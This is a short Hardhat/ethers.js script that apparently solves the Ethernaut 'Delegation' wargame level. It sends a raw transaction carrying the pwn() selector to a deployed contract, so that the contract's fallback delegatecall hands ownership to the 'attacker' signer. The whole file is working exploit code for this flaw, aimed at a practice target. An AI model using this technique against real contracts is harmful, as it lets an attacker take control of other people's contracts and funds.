import { ethers } from "hardhat";

const CONTRACT_NAME = "Delegation";
const CONTRACT_ADDRESS = "0xE20156AF407C3D79834f5658CD5436B28dD99069";

async function main() {
  const [attacker] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const iface = new ethers.utils.Interface(["function pwn()"]);
  const data = iface.encodeFunctionData("pwn");

  const tx = await attacker.sendTransaction({
    to: contract.address,
    data,
    gasLimit: 100000,
  });
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
